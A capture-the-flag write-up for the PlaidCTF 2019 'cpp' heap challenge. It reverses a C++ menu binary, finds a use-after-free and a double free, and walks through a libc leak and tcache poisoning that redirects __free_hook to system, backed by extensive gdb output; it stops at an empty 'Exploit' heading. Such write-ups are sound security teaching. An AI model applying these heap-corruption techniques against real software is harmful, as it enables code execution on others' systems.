#    plaidctf 2019 cpp

Let's take a look at the binary, and the libc version:
```
$    file cpp
cpp: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9ccb6196788d9ba1e3953535628a62549f3bcce8, stripped
$    pwn checksec cpp
[*] '/Hackery/pod/modules/tcache/plaid19_cpp/cpp'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$    ./libc-2.27.so
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 7.3.0.
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$    ./cpp
1. Add
2. Remove
3. View
4. Exit
Choice:
```

So we can see that we are dealing with a `64` bit binary, with all of the standard binary mitigations. We can also see that the libc version we are dealing with is `libc-2.27` (corresponds to Ubuntu `18.04`). When we run the binary, we can see that we are prompted with a menu to add chunks, remove chunks, view chunks, and exit.

## Reversing

When we start reversing this program, we see that it was written in C++. As such it is a bit of a pain to reverse, so a lot of the reversing was done in gdb (and I didn't fully reverse out everything). First off we see that it prompts us with for our menu option with the promptMenu function in the:

```
      menuOption = promptMenu();
      menuOptionCpy1 = (int)menuOption;
      minus2 = menuOptionCpy1 + -2;
      removeCheck = minus2 == 0;
      if (!removeCheck) break;
```

Time to go through and reverse the rest of the functions.

### Add Option

Looking through the code for the Add option, we see that it prompts us for values for name and buf:

```
      operator<<<std--char_traits<char>>((basic_ostream *)cout,"name: ");
      operator>><char,std--char_traits<char>,std--allocator<char>>
                ((basic_istream *)cin,(basic_string *)&local_f8);
      operator<<<std--char_traits<char>>((basic_ostream *)cout,"buf: ");
```

After that it creates strings for the corresponding values which are stored in the heap. When we look at the data structure for the strings, we can see that it is a pointer to the name accompanied with the length of the string (in this case the name is `sasori` and buf is `deidara`):

```
gef➤  r
Starting program: /Hackery/pod/modules/tcache/plaid19_cpp/cpp
1. Add
2. Remove
3. View
4. Exit
Choice: 1
name: sasori
buf: deidara
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: ^C
Program received signal SIGINT, Interrupt.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007ffff782ea00  →  0x00000000fbad2288
$rcx   : 0x00007ffff7553081  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x400             
$rsp   : 0x00007fffffffdcb8  →  0x00007ffff74d0148  →  <_IO_file_underflow+296> test rax, rax
$rbp   : 0xd68             
$rsi   : 0x000055555576a280  →  0x0a61726164696564 ("deidara"?)
$rdi   : 0x0               
$rip   : 0x00007ffff7553081  →  0x5777fffff0003d48 ("H="?)
$r8    : 0x00007ffff78308c0  →  0x0000000000000000
$r9    : 0x00007ffff7fd8080  →  0x00007ffff7fd8080  →  [loop detected]
$r10   : 0xa               
$r11   : 0x246             
$r12   : 0x00007ffff782a760  →  0x0000000000000000
$r13   : 0x00007ffff782b2a0  →  0x0000000000000000
$r14   : 0x00007ffff782b2a0  →  0x0000000000000000
$r15   : 0x00007fffffffdde0  →  0x000069726f736173 ("sasori"?)
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdcb8│+0x0000: 0x00007ffff74d0148  →  <_IO_file_underflow+296> test rax, rax     ← $rsp
0x00007fffffffdcc0│+0x0008: 0x00007ffff782ea00  →  0x00000000fbad2288
0x00007fffffffdcc8│+0x0010: 0x00007ffff782b2a0  →  0x0000000000000000
0x00007fffffffdcd0│+0x0018: 0x00007fffffffdd5b  →  0xdd30c000007fff00
0x00007fffffffdcd8│+0x0020: 0x00007ffff7dd30c0  →  0x00007ffff7dc87b0  →  0x00007ffff7b04aa0  →  <std::ctype<char>::~ctype()+0> mov rax, QWORD PTR [rip+0x2ca0c9]        # 0x7ffff7dceb70
0x00007fffffffdce0│+0x0028: 0x00007fffffffdd94  →  0x2777c30000007fff
0x00007fffffffdce8│+0x0030: 0x00007ffff74d13f2  →  <_IO_default_uflow+50> cmp eax, 0xffffffff
0x00007fffffffdcf0│+0x0038: 0x00007fffffffdd30  →  0x00007fffffffdd80  →  0x00007ffff7dd30c0  →  0x00007ffff7dc87b0  →  0x00007ffff7b04aa0  →  <std::ctype<char>::~ctype()+0> mov rax, QWORD PTR [rip+0x2ca0c9]        # 0x7ffff7dceb70
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7553075 <read+5>         add    BYTE PTR cs:[rbx+0x75c08500], cl
   0x7ffff755307c <read+12>        adc    esi, DWORD PTR [rcx]
   0x7ffff755307e <read+14>        ror    BYTE PTR [rdi], 0x5
 → 0x7ffff7553081 <read+17>        cmp    rax, 0xfffffffffffff000
   0x7ffff7553087 <read+23>        ja     0x7ffff75530e0 <__GI___libc_read+112>
   0x7ffff7553089 <read+25>        repz   ret
   0x7ffff755308b <read+27>        nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7553090 <read+32>        push   r12
   0x7ffff7553092 <read+34>        push   rbp
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cpp", stopped, reason: SIGINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7553081 → __GI___libc_read(fd=0x0, buf=0x55555576a280, nbytes=0x400)
[#1] 0x7ffff74d0148 → _IO_new_file_underflow(fp=0x7ffff782ea00 <_IO_2_1_stdin_>)
[#2] 0x7ffff74d13f2 → __GI__IO_default_uflow(fp=0x7ffff782ea00 <_IO_2_1_stdin_>)
[#3] 0x7ffff7b3989d → __gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >::underflow()()
[#4] 0x7ffff7b4763a → std::istream::sentry::sentry(std::istream&, bool)()
[#5] 0x7ffff7b478ae → std::istream::operator>>(int&)()
[#6] 0x555555555dfe → mov rcx, QWORD PTR [rsp+0x8]
[#7] 0x5555555555d2 → cmp eax, 0x2
[#8] 0x7ffff7464b97 → __libc_start_main(main=0x555555555290, argc=0x1, argv=0x7fffffffdfa8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdf98)
[#9] 0x5555555558ea → hlt
────────────────────────────────────────────────────────────────────────────────
0x00007ffff7553081 in __GI___libc_read (fd=0x0, buf=0x55555576a280, nbytes=0x400) at ../sysdeps/unix/sysv/linux/read.c:27
27    ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
gef➤  search-pattern sasori
[+] Searching 'sasori' in memory
[+] In '[heap]'(0x555555758000-0x555555779000), permission=rw-
  0x55555576a6d0 - 0x55555576a6d6  →   "sasori"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdde0 - 0x7fffffffdde6  →   "sasori"
  0x7fffffffde20 - 0x7fffffffde26  →   "sasori"
  0x7fffffffde70 - 0x7fffffffde76  →   "sasori"
gef➤  search-pattern 0x55555576a6d0
[+] Searching '0x55555576a6d0' in memory
[+] In '[heap]'(0x555555758000-0x555555779000), permission=rw-
  0x55555576a6c0 - 0x55555576a6d8  →   "\xd0\xa6\x76\x55\x55\x55[...]"
gef➤  x/20g 0x55555576a6b0
0x55555576a6b0:    0x7    0x55555576a6f0
0x55555576a6c0:    0x55555576a6d0    0x6
0x55555576a6d0:    0x69726f736173    0x0
0x55555576a6e0:    0x0    0x21
0x55555576a6f0:    0x61726164696564    0x0
0x55555576a700:    0x0    0xe901
0x55555576a710:    0x0    0x0
0x55555576a720:    0x0    0x0
0x55555576a730:    0x0    0x0
0x55555576a740:    0x0    0x0
gef➤  x/s 0x55555576a6f0
0x55555576a6f0:    "deidara"
gef➤  x/s 0x55555576a6d0
0x55555576a6d0:    "sasori"
```

Also one important thing to take note of (for later) the buf string is allocated prior to the name string. In addition to that for some reason the buf value is passed to free (I found this happening at 0x1fdd). This means that if we can call free and pass an argument to it (will come in handy soon).

### Remove Option

For this option it starts off by prompting us for an index with the scan_index function (this function also prints the indexes with the corresponding names). It then checks to ensure that the index provided is greater than or equal to 0:

```
    LODWORD(remove_index) = scanIndex();
    if ( (signed int)remove_index >= 0 )
    {
```

Proceeding that is a check to ensure that the index provided does have a corresponding object for it. If it isn't corresponding to an object, then this option does nothing:

```
      index = getIndex();
      if ((-1 < index) &&
```

However what is interesting with this, is we see that the object that is freed isn't related to the index we provide. It takes the value stored in `DAT_00303268`, subtracts 0x28 (in the psuedocode it shows `-10`, but the assembly code shows us the truth) from it, then deletes it. This doesn't necissarily coincide with the index we gave it:

```
        piVar1 = DAT_00303268;
        ppvVar2 = (void **)(DAT_00303268 + -10);
        DAT_00303268 = DAT_00303268 + -0xc;
        if (*ppvVar2 != (void *)0x0) {
          operator.delete[](*ppvVar2);
        }
```

When we look in a debugger, we see that it always frees (since the strings are stored in the heap) the last added string:

```
gef➤  pie b *0x167e
gef➤  pie run
Stopped due to shared library event (no libraries added or removed)
1. Add
2. Remove
3. View
4. Exit
Choice: 1
name: sasori
buf: deidara
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 1
name: hidan
buf: kakazu
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 2
0: sasori
1: hidan
idx: 0

.    .    .

─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555672                  mov    QWORD PTR [rip+0x201bef], rax        # 0x555555757268
   0x555555555679                  test   rdi, rdi
   0x55555555567c                  je     0x555555555683
 → 0x55555555567e                  call   0x5555555551e0 <_ZdaPv@plt>
   ↳  0x5555555551e0 <operator+0>     jmp    QWORD PTR [rip+0x201d9a]        # 0x555555756f80
      0x5555555551e6 <operator+0>     push   0x15
      0x5555555551eb <operator+0>     jmp    0x555555555080
      0x5555555551f0 <__cxa_rethrow@plt+0> jmp    QWORD PTR [rip+0x201d92]        # 0x555555756f88
      0x5555555551f6 <__cxa_rethrow@plt+6> push   0x16
      0x5555555551fb <__cxa_rethrow@plt+11> jmp    0x555555555080
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
_ZdaPv@plt (
   $rdi = 0x000055555576a780 → 0x0000757a616b616b ("kakazu"?),
   $rsi = 0x000055555576a765 → 0x0000000000000000,
   $rdx = 0x0000000061646968,
   $rcx = 0x000000006e616469
)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cpp", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555567e → call 0x5555555551e0 <_ZdaPv@plt>
[#1] 0x7ffff7464b97 → __libc_start_main(main=0x555555555290, argc=0x1, argv=0x7fffffffdf28, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdf18)
[#2] 0x5555555558ea → hlt
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/s $rdi
0x55555576a780:    "kakazu"

.    .    .

So we can see that we freed the strings associated with hidan and kakazu (please excuse the weeb references). When we go to view a string, we can see that we can reference the strings we freed and we see that we have what appears to be some sort of infoleak:

gef➤  c
Continuing.

Program received signal SIGALRM, Alarm clock.
Done!
1. Add
2. Remove
3. View
4. Exit
Choice: 3
0: hidan
idx: 0
��vUUU
Done!
1. Add
2. Remove
3. View
4. Exit
Choice:
```
With this we can see that we have a use after free bug, and a double free bug.

### View Option

Looking at the code in ghidra, we can see this essentially just prints the data of the chunk using `puts`:

```
      if (iVar4 == 3) {
        iVar4 = FUN_00101ab0();
        if ((-1 < iVar4) &&
           ((ulong)(long)iVar4 <
            (ulong)(((long)((long)DAT_00303268 - DAT_00303260) >> 4) * -0x5555555555555555))) {
          puts(*(char **)(DAT_00303260 + 8 + (long)iVar4 * 0x30));
        }
      }
```

## Exploitation

So for our exploitation process, we will have two parts. The first will be an infoleak, the second will be writing the address of `system` to the free hook, and freeing a chunk that points to `/bin/sh`. I would just write a oneshot gadget to the malloc hook, however all of the conditions for that gadget are not met when it is called.

### Infoleak

For the infoleak, we will be leaking a libc address from the smallbin. The smallbin contains a doubly linked list (a fwd and back pointer), which links back to the main arena (which is in the libc). We will first fill up the tcache by freeing `7` different things (keep in mind, each chunk we malloc will give us two chunks to free). With how the C++ heap works, we will need to allocate a name with the chunk that is `0x408` bytes large (I found this out via trial and error). If not, the chunk will end up in the fastbin and we will get a heap infoleak instead

Here is what the chunk looks like prior to being placed in the small bin (input is `15935728`):
```
gef➤  x/4g 0x556b3a5941b0
0x556b3a5941b0: 0x0 0x21
0x556b3a5941c0: 0x3832373533393531  0x7f89a5507c00
```

Here is what the chunk looks like after being placed in the small bin:
```
gef➤  x/4g 0x556b3a5941b0
0x556b3a5941b0: 0x0 0x41
0x556b3a5941c0: 0x7f89a5507cd0  0x7f89a5507cd0
```

Using gef, we can even see it in the small bin:
```
gef➤  heap bins
───────────────────── Tcachebins for arena 0x7f89a5507c40 ─────────────────────
Tcachebins[idx=0, size=0x10] count=7  ←  Chunk(addr=0x556b3a594200, size=0x20, flags=)  ←  Chunk(addr=0x556b3a594300, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a593290, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a5942e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a5932f0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a593bd0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x556b3a593bb0, size=0x20, flags=PREV_INUSE)
Tcachebins[idx=1, size=0x20] count=1  ←  Chunk(addr=0x556b3a593310, size=0x30, flags=PREV_INUSE)
Tcachebins[idx=2, size=0x30] count=1  ←  Chunk(addr=0x556b3a5932b0, size=0x40, flags=PREV_INUSE)
Tcachebins[idx=3, size=0x40] count=1  ←  Chunk(addr=0x556b3a593340, size=0x50, flags=PREV_INUSE)
Tcachebins[idx=5, size=0x60] count=1  ←  Chunk(addr=0x556b3a594270, size=0x70, flags=)
Tcachebins[idx=7, size=0x80] count=1  ←  Chunk(addr=0x556b3a593390, size=0x90, flags=PREV_INUSE)
Tcachebins[idx=11, size=0xc0] count=1  ←  Chunk(addr=0x556b3a593ae0, size=0xd0, flags=PREV_INUSE)
Tcachebins[idx=14, size=0xf0] count=1  ←  Chunk(addr=0x556b3a593420, size=0x100, flags=PREV_INUSE)
Tcachebins[idx=29, size=0x1e0] count=1  ←  Chunk(addr=0x556b3a593520, size=0x1f0, flags=PREV_INUSE)
Tcachebins[idx=59, size=0x3c0] count=1  ←  Chunk(addr=0x556b3a593710, size=0x3d0, flags=PREV_INUSE)
────────────────────── Fastbins for arena 0x7f89a5507c40 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
─────────────────── Unsorted Bin for arena '*0x7f89a5507c40' ───────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────── Small Bins for arena '*0x7f89a5507c40' ────────────────────
[+] small_bins[3]: fw=0x556b3a5941b0, bk=0x556b3a5941b0
 →   Chunk(addr=0x556b3a5941c0, size=0x40, flags=PREV_INUSE)
[+] small_bins[4]: fw=0x556b3a594210, bk=0x556b3a594210
 →   Chunk(addr=0x556b3a594220, size=0x50, flags=PREV_INUSE)
[+] Found 2 chunks in 2 small non-empty bins.
──────────────────── Large Bins for arena '*0x7f89a5507c40' ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

With that, we can just view that chunk using the UAF, and we will have our infoleak.

### OneGadget Write

So next up we will be writing the address of a system to the hook. Starting off, I will allocate all chunks from the tcache to clear it out. This will help us pass checks in malloc later on (when I tried this without clearing out the chunk, I failed some checks and the program crashed without giving us code execution). So how the tcache works, it will store free chunks in the tcache in a linked list. The linked list will point to the next chunk which will be allocated:

```
gef➤  heap bins
───────────────────── Tcachebins for arena 0x7f73349e5c40 ─────────────────────
Tcachebins[idx=0, size=0x10] count=5  ←  Chunk(addr=0x565454052290, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x565454052380, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5654540522f0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x5654540524b0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x565454052490, size=0x20, flags=PREV_INUSE)
Tcachebins[idx=2, size=0x30] count=1  ←  Chunk(addr=0x5654540522b0, size=0x40, flags=PREV_INUSE)
Tcachebins[idx=5, size=0x60] count=1  ←  Chunk(addr=0x565454052310, size=0x70, flags=PREV_INUSE)
Tcachebins[idx=11, size=0xc0] count=1  ←  Chunk(addr=0x5654540523c0, size=0xd0, flags=PREV_INUSE)
────────────────────── Fastbins for arena 0x7f73349e5c40 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
─────────────────── Unsorted Bin for arena '*0x7f73349e5c40' ───────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────── Small Bins for arena '*0x7f73349e5c40' ────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────── Large Bins for arena '*0x7f73349e5c40' ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/4g 0x565454052290
0x565454052290: 0x565454052380  0x0
0x5654540522a0: 0x0 0x41
gef➤  x/4g 0x565454052380
0x565454052380: 0x5654540522f0  0x0
0x565454052390: 0x0 0x21
gef➤  x/4g 0x5654540522f0
0x5654540522f0: 0x5654540524b0  0x0
0x565454052300: 0x0 0x71
```

Here we essentially just allocated and freed `5` chunks (this is before we clear out the tcache). These all ended up in the tcache with `idx` `0`. We also see here that each one contains a pointer to the next chunk. So if we can overwrite the next pointer of a tcache entry to let's say the address of the free hook, we will be able to allocate a chunk to the free hook. With that, we will be able to write to it the address of the oneshot gadget. Before we allocate more chunks for this, the tcache looks like this:

```
gef➤  heap bins
───────────────────── Tcachebins for arena 0x7fcd5c1eac40 ─────────────────────
Tcachebins[idx=0, size=0x10] count=1  ←  Chunk(addr=0x55c26839d200, size=0x20, flags=)
Tcachebins[idx=1, size=0x20] count=1  ←  Chunk(addr=0x55c26839c310, size=0x30, flags=PREV_INUSE)
Tcachebins[idx=2, size=0x30] count=1  ←  Chunk(addr=0x55c26839c2b0, size=0x40, flags=PREV_INUSE)
Tcachebins[idx=3, size=0x40] count=1  ←  Chunk(addr=0x55c26839c340, size=0x50, flags=PREV_INUSE)
Tcachebins[idx=5, size=0x60] count=1  ←  Chunk(addr=0x55c26839d270, size=0x70, flags=)
Tcachebins[idx=7, size=0x80] count=1  ←  Chunk(addr=0x55c26839c390, size=0x90, flags=PREV_INUSE)
Tcachebins[idx=11, size=0xc0] count=1  ←  Chunk(addr=0x55c26839cae0, size=0xd0, flags=PREV_INUSE)
Tcachebins[idx=14, size=0xf0] count=1  ←  Chunk(addr=0x55c26839c420, size=0x100, flags=PREV_INUSE)
Tcachebins[idx=29, size=0x1e0] count=1  ←  Chunk(addr=0x55c26839c520, size=0x1f0, flags=PREV_INUSE)
Tcachebins[idx=59, size=0x3c0] count=1  ←  Chunk(addr=0x55c26839c710, size=0x3d0, flags=PREV_INUSE)
────────────────────── Fastbins for arena 0x7fcd5c1eac40 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
─────────────────── Unsorted Bin for arena '*0x7fcd5c1eac40' ───────────────────
[+] unsorted_bins[0]: fw=0x55c26839d1d0, bk=0x55c26839d1d0
 →   Chunk(addr=0x55c26839d1e0, size=0x20, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
──────────────────── Small Bins for arena '*0x7fcd5c1eac40' ────────────────────
[+] small_bins[4]: fw=0x55c26839d210, bk=0x55c26839d210
 →   Chunk(addr=0x55c26839d220, size=0x50, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
──────────────────── Large Bins for arena '*0x7fcd5c1eac40' ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  
```

To do the write, we will execute a double free. How this will work, is that we will have two chunks allocated. Proceeding that, we will allocate two more chunks. Then we will remove the chunk at index `0`. Because of the bug where it only actually frees the last allocated chunk, it will free the second chunk twice (since it frees the last chunk allocated, but it will get rid of the chunk you specify). As a result, it will free the second chunk twice, and the tcache will look like this:

```
gef➤  heap bins
───────────────────── Tcachebins for arena 0x7f1219689c40 ─────────────────────
Tcachebins[idx=0, size=0x10] count=7  ←  Chunk(addr=0x55aec1549290, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x55aec1549290, size=0x20, flags=PREV_INUSE)  →  [loop detected]
Tcachebins[idx=1, size=0x20] count=1  ←  Chunk(addr=0x55aec1549310, size=0x30, flags=PREV_INUSE)
Tcachebins[idx=2, size=0x30] count=2  ←  Chunk(addr=0x55aec154a1c0, size=0x40, flags=PREV_INUSE)  ←  Chunk(addr=0x55aec15492b0, size=0x40, flags=PREV_INUSE)
Tcachebins[idx=3, size=0x40] count=1  ←  Chunk(addr=0x55aec1549340, size=0x50, flags=PREV_INUSE)
Tcachebins[idx=5, size=0x60] count=1  ←  Chunk(addr=0x55aec154a270, size=0x70, flags=)
Tcachebins[idx=7, size=0x80] count=1  ←  Chunk(addr=0x55aec1549390, size=0x90, flags=PREV_INUSE)
Tcachebins[idx=11, size=0xc0] count=1  ←  Chunk(addr=0x55aec1549ae0, size=0xd0, flags=PREV_INUSE)
Tcachebins[idx=14, size=0xf0] count=1  ←  Chunk(addr=0x55aec1549420, size=0x100, flags=PREV_INUSE)
Tcachebins[idx=29, size=0x1e0] count=1  ←  Chunk(addr=0x55aec1549520, size=0x1f0, flags=PREV_INUSE)
Tcachebins[idx=59, size=0x3c0] count=1  ←  Chunk(addr=0x55aec1549710, size=0x3d0, flags=PREV_INUSE)
────────────────────── Fastbins for arena 0x7f1219689c40 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
─────────────────── Unsorted Bin for arena '*0x7f1219689c40' ───────────────────
[+] unsorted_bins[0]: fw=0x55aec1549be0, bk=0x55aec1549be0
 →   Chunk(addr=0x55aec1549bf0, size=0x420, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
──────────────────── Small Bins for arena '*0x7f1219689c40' ────────────────────
[+] small_bins[3]: fw=0x55aec154a1b0, bk=0x55aec154a1b0
 →   Chunk(addr=0x55aec154a1c0, size=0x40, flags=PREV_INUSE)
[+] small_bins[4]: fw=0x55aec154a210, bk=0x55aec154a210
 →   Chunk(addr=0x55aec154a220, size=0x50, flags=PREV_INUSE)
[+] Found 2 chunks in 2 small non-empty bins.
──────────────────── Large Bins for arena '*0x7f1219689c40' ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

We can see here that in the tcache, the entry at address `0x55aec1549290` leads to `0x55aec1549290`, which is itself. Since we freed the same chunk twice, it was entered into the tcache twice. Now we will allocate a chunk and write to it the address of the free hook. Since there are two entries for the `0x55aec1549290` chunk, one will still be in the tcache and have a next pointer to the next chunk, which we will overwrite. After the overwrite, the tcache will look like this:

```
ggef➤  heap bins
───────────────────── Tcachebins for arena 0x7f2f01102c40 ─────────────────────
Tcachebins[idx=0, size=0x10] count=2  ←  Chunk(addr=0x562ae9e281c0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x7f2f011048e8, size=0x0, flags=)
Tcachebins[idx=1, size=0x20] count=1  ←  Chunk(addr=0x562ae9e27310, size=0x30, flags=PREV_INUSE)
Tcachebins[idx=2, size=0x30] count=1  ←  Chunk(addr=0x562ae9e272b0, size=0x40, flags=PREV_INUSE)
Tcachebins[idx=3, size=0x40] count=1  ←  Chunk(addr=0x562ae9e27340, size=0x50, flags=PREV_INUSE)
Tcachebins[idx=5, size=0x60] count=1  ←  Chunk(addr=0x562ae9e28270, size=0x70, flags=)
Tcachebins[idx=7, size=0x80] count=1  ←  Chunk(addr=0x562ae9e27390, size=0x90, flags=PREV_INUSE)
Tcachebins[idx=11, size=0xc0] count=1  ←  Chunk(addr=0x562ae9e27ae0, size=0xd0, flags=PREV_INUSE)
Tcachebins[idx=14, size=0xf0] count=1  ←  Chunk(addr=0x562ae9e27420, size=0x100, flags=PREV_INUSE)
Tcachebins[idx=29, size=0x1e0] count=1  ←  Chunk(addr=0x562ae9e27520, size=0x1f0, flags=PREV_INUSE)
Tcachebins[idx=59, size=0x3c0] count=1  ←  Chunk(addr=0x562ae9e27710, size=0x3d0, flags=PREV_INUSE)
────────────────────── Fastbins for arena 0x7f2f01102c40 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
─────────────────── Unsorted Bin for arena '*0x7f2f01102c40' ───────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────── Small Bins for arena '*0x7f2f01102c40' ────────────────────
[+] small_bins[1]: fw=0x562ae9e281d0, bk=0x562ae9e281d0
 →   Chunk(addr=0x562ae9e281e0, size=0x20, flags=PREV_INUSE)
[+] small_bins[4]: fw=0x562ae9e28210, bk=0x562ae9e28210
 →   Chunk(addr=0x562ae9e28220, size=0x50, flags=PREV_INUSE)
[+] Found 2 chunks in 2 small non-empty bins.
──────────────────── Large Bins for arena '*0x7f2f01102c40' ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/g 0x7f2f011048e8
0x7f2f011048e8 <__free_hook>: 0x0
```

So we can see that the address of the malloc hook is in the tcache. After that we can allocate it next and write to it:

```
gef➤  heap bins
───────────────────── Tcachebins for arena 0x7f2f01102c40 ─────────────────────
Tcachebins[idx=1, size=0x20] count=1  ←  Chunk(addr=0x562ae9e27310, size=0x30, flags=PREV_INUSE)
Tcachebins[idx=2, size=0x30] count=1  ←  Chunk(addr=0x562ae9e272b0, size=0x40, flags=PREV_INUSE)
Tcachebins[idx=3, size=0x40] count=1  ←  Chunk(addr=0x562ae9e27340, size=0x50, flags=PREV_INUSE)
Tcachebins[idx=5, size=0x60] count=1  ←  Chunk(addr=0x562ae9e28270, size=0x70, flags=)
Tcachebins[idx=7, size=0x80] count=1  ←  Chunk(addr=0x562ae9e27390, size=0x90, flags=PREV_INUSE)
Tcachebins[idx=11, size=0xc0] count=1  ←  Chunk(addr=0x562ae9e27ae0, size=0xd0, flags=PREV_INUSE)
Tcachebins[idx=14, size=0xf0] count=1  ←  Chunk(addr=0x562ae9e27420, size=0x100, flags=PREV_INUSE)
Tcachebins[idx=29, size=0x1e0] count=1  ←  Chunk(addr=0x562ae9e27520, size=0x1f0, flags=PREV_INUSE)
Tcachebins[idx=59, size=0x3c0] count=1  ←  Chunk(addr=0x562ae9e27710, size=0x3d0, flags=PREV_INUSE)
────────────────────── Fastbins for arena 0x7f2f01102c40 ──────────────────────
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
─────────────────── Unsorted Bin for arena '*0x7f2f01102c40' ───────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────── Small Bins for arena '*0x7f2f01102c40' ────────────────────
[+] small_bins[1]: fw=0x562ae9e281d0, bk=0x562ae9e281d0
 →   Chunk(addr=0x562ae9e281e0, size=0x20, flags=PREV_INUSE)
[+] small_bins[4]: fw=0x562ae9e28210, bk=0x562ae9e28210
 →   Chunk(addr=0x562ae9e28220, size=0x50, flags=PREV_INUSE)
[+] Found 2 chunks in 2 small non-empty bins.
──────────────────── Large Bins for arena '*0x7f2f01102c40' ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/g 0x7f2f011048e8
0x7f2f011048e8 <__free_hook>: 0x7f2f00d66440
gef➤  x/i 0x7f2f00d66440
   0x7f2f00d66440 <system>: test   rdi,rdi
```

As you can see, we were able to write over the free hook with the address of `system`. With that we will be able to get a shell by having `free` called with a chunk that points to `/bin/sh` (which happens when we add a chunk).

## Exploit

